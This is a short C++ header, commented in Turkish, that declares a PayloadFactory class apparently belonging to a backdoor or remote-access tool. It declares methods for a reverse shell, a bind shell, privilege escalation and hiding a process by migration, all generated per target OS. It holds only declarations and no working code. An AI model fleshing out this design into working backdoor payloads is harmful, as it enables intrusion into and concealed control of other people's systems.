#ifndef __PAYLOAD_FACTORY_HPP__
#define __PAYLOAD_FACTORY_HPP__

#include "temDefines.hpp"

/*
    -BURASI CLIENT DOSYALARININ URETIMINI SAGLAYACAK
    -RUNTIME ESNASINDA YADA ARGUMAN YOLUYLA
*/

class PayloadFactory{
private:
    TEM_TARGET_OS targetSystem;

    //PAYLOAD_FACTORY_BACKDOOR_GENERATE
    bool temReverseShell();                         //reverse shell baslatir
    bool temBindShell();                            //bind shell portuna baglanir
    

    //PAYLOAD_FACTORY_OTHERS
    bool temPrivilegeEscalation();                  //yetki yukseltme
    bool temMigrateProcess();                       //processi saklama

    
public:
    PayloadFactory(TEM_TARGET_OS targetSystem);     //burada belirtilen hedef sisteme gore payload uretilecek

    bool createPayloadRuntime();
    bool createPayloadExecutable();


};


#endif 